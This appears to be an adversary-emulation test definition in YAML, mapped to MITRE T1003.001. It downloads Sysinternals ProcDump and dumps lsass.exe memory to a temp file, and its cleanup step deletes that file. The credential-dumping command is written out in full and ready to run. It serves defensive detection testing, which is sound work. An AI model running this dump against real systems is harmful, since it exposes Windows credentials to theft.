api_version: "2.0"
name: Dump LSASS.exe Memory using ProcDump
description: |
    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
    ProcDump.

    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
args:
    - name: output_file
      type: path
      default: C:\Windows\Temp\lsass_dump.dmp
    - name: procdump_exe
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe
uuid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.001: LSASS Memory'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
      inline: |
        if (Test-Path "#{procdump_exe}") {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
        Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
        New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
        }}
      executor: powershell
    - name: dump-lsass.exe-memory-using-procdump
      inline: |
        "{{.Args.procdump_exe}}" -accepteula -ma lsass.exe {{.Args.output_file}}
      executor: command_prompt
      cleanup:
        inline: |
            del "{{.Args.output_file}}" >nul 2> nul
        executor: command_prompt
